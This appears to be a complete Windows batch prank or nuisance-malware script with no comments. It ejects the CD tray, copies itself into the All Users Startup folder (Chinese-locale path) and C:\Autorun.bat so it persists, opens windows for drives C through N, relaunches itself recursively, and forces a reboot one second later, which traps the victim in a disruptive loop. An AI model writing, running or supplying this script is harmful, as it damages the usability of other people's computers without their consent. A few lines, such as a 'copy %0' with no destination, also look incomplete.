@echo off
color 0a
title=
mode con cols=14 lines=1
@echo 
mshta "javascript:new ActiveXObject('WMPlayer.OCX').cdromCollection.Item(0).Eject();window.close();"
copy %0 c:\Documents" "and" "Settings\All" "Users\「开始」菜单\程序\启动\Autorun.bat
copy %0 c:\Autorun.bat
start c:/&start d:/&start e:/&start f:/&start g:/&start h:/&start i:/&start j:/&start k:/&start l:/&start m:/&start n:/
start %0
copy %0 
@echo 
shutdown -r -t 1

